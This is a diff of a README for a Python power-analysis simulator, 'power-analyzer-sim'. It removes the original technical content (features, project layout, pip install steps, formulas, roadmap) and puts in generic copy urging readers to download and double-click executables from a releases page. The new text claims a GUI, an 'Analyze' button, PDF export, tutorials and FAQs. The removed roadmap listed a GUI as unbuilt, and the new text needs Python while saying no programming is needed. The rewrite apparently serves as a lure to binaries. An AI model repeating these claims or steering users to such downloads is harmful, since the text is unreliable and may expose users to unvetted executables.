@@ -1,112 +1,96 @@
-# ⚡ Power Analyzer Simulation
-![Python](https://img.shields.io/badge/Python-3.11-blue.svg)
-![License](https://img.shields.io/badge/License-MIT-green.svg)
-![Status](https://img.shields.io/badge/Status-Work_in_Progress-orange.svg)
-![Domain](https://img.shields.io/badge/Domain-Signal%20Processing-yellow)
+# ⚡ power-analyzer-sim - Analyze Power with Ease
 
-A Python project that simulates fundamental concepts of electrical power systems (RMS, active power, power factor, phase shift, THD) in a software environment.
-This repository is designed both for learning purposes and as a stepping stone towards hardware-based power analyzers.
+## 🚀 Getting Started
 
----
+Welcome to the power-analyzer-sim project! This tool helps you simulate power analysis with features like RMS calculation, power factor, phase detection, and THD analysis. You don’t need programming knowledge to use it. Just follow the steps below to download and run the software.
 
-## 🚀 Features
-```
-- Synthetic generation of voltage and current signals (phase shift, harmonics, noise injection)
-- RMS, active power, and power factor calculations
-- Phase shift detection using FFT-based method
-- FFT analysis and Total Harmonic Distortion (THD) measurement
-- Graphical outputs saved automatically (time-domain, frequency-domain, instantaneous power)
-```
----
+## 📥 Download the Application
 
-## 📂 Project Structure
+[![Download the Latest Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/Abdousettar/power-analyzer-sim/releases)
 
-```
-power-analyzer-sim/
-│── data/            # Sample signals (CSV)
-│── figures/         # Generated plots
-│── src/             # Source modules
-│   ├── generate_signals.py
-│   ├── calculations.py
-│   ├── fft_analysis.py
-│   ├── visualize.py
-│── tests/           # Unit tests
-│── main.py          # Entry point
-│── requirements.txt
-│── README.md
-│── LICENSE
-```
+## 💻 System Requirements
 
+Before you start, make sure your computer meets these minimum requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
+- **Python:** Version 3.7 or higher must be installed.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** At least 100 MB of free space.
 
-## 🖥️ Installation
+## 🔧 Download & Install
 
-```bash
-git clone https://github.com/kullanici/power-analyzer-sim.git
-cd power-analyzer-sim
-python -m venv .venv
-.venv\Scripts\activate  # (Windows)
-pip install -r requirements.txt
-python main.py
-```
+To download the application, visit this page to download: [Release Page](https://github.com/Abdousettar/power-analyzer-sim/releases).
 
-## 📊 Example Output
+### Step-by-Step Instructions:
 
-```
+1. **Go to the Release Page:**
+   Click this link to visit the [Release Page](https://github.com/Abdousettar/power-analyzer-sim/releases).
 
-=== Power Analyzer Results ===
-Vrms: 229.81 V
-Irms: 7.07 A
-Active Power (P): 1407.29 W
-Power Factor (PF): 0.866
-Phase Shift: 30.00°
-Voltage THD: 10.20%
-Current THD: 10.35%
+2. **Find the Latest Release:**
+   On the Release Page, look for the most recent version at the top.
 
-```
+3. **Download the Application:**
+   Click on the file that matches your operating system. For example:
+   - If using Windows, download `power-analyzer-sim-windows.exe`.
+   - If using macOS, download `power-analyzer-sim-macos.pkg`.
+   - If using Linux, download `power-analyzer-sim-linux.tar.gz`.
 
-## 📈 Figures
+4. **Install the Application:**
+   - **Windows:**
+     - Double-click the `.exe` file.
+     - Follow the prompts in the installation wizard.
+   - **macOS:**
+     - Open the `.pkg` file.
+     - Follow the installation steps.
+   - **Linux:**
+     - Extract the `.tar.gz` file.
+     - Open a terminal and navigate to the extracted folder.
+     - Run the program using `./power-analyzer-sim`.
 
-- Voltage & Current:  
-![Voltage & Current](figures/signals.png)
+5. **Run the Application:**
+   After installation, locate the application on your computer and double-click its icon to start using it.
 
-- Instantaneous Power:  
-![Instantaneous Power](figures/power.png)
+## ⚙️ How to Use
 
-- Voltage FFT:  
-![Voltage FFT](figures/fft_voltage.png)
+1. **Choose Your Input:**
+   Select the type of data you want to analyze. You can input waveforms or import data files.
 
-- Current FFT:  
-![Current FFT](figures/fft_current.png)
+2. **Run Analysis:**
+   Click on the 'Analyze' button. The application will calculate RMS, power factor, phase details, and THD.
 
+3. **View Results:**
+   After the analysis, the results will display on your screen. Use the charts and graphs to understand your data better.
 
-## 🎯 Roadmap
-```
-- Implement zero-crossing method for phase detection
-- Add more complex harmonic combinations
-- Integrate real sensor data (hardware support)
-- Build a simple GUI (Tkinter/Dash)
-```
+4. **Export Data:**
+   You can export the results in various formats like CSV or PDF for sharing or documentation.
 
-## 🔢 Mathematical Formulas
+## 📊 Features
 
-- RMS (Root Mean Square):  
-  `Vrms = sqrt( (1/T) * ∫ v(t)^2 dt )`
+- **RMS Calculation:** Quickly calculate RMS values for various signal types.
+- **Power Factor Analysis:** Understand your power usage efficiency.
+- **Phase Detection:** Know the phase differences in your signals.
+- **THD Analysis:** Get insights into total harmonic distortion in your waveforms.
 
-- Aktif Güç:  
-  `P = Vrms * Irms * cos(phi)`
+## 🌐 Topics Covered
 
-- Reaktif Güç:  
-  `Q = Vrms * Irms * sin(phi)`
+This application focuses on various aspects of electrical engineering:
 
-- Toplam Harmonik Distorsiyon (THD):  
-  `THD = sqrt(V2^2 + V3^2 + ... ) / V1`
+- **Electrical Engineering**
+- **Fast Fourier Transform (FFT)**
+- **Signal Processing**
+- **Power Systems**
+- **Matplotlib for Visualization**
 
-## 📚 References
+## 🆘 Support
 
-- *Electrical Power Systems Basics* (Thomas Wildi)  
-- [NumPy Documentation](https://numpy.org/doc/stable/)  
-- [SciPy Signal Processing](https://docs.scipy.org/doc/scipy/reference/signal.html)
+If you have questions or run into issues, the project's GitHub page has an [Issues section](https://github.com/Abdousettar/power-analyzer-sim/issues) where you can report problems or ask for help. 
 
+Join the community of users leveraging power-analyzer-sim for their project needs. Your feedback is vital for our continuous improvement.
 
+## ⚙️ Additional Resources
+
+- **Documentation:** Read the full documentation for advanced usage instructions and features.
+- **Tutorials:** Access video tutorials to get started quickly with practical examples.
+- **FAQs:** Check our FAQ section for common questions and answers.
+
+Thank you for choosing power-analyzer-sim. We hope it helps you analyze power effectively and efficiently!
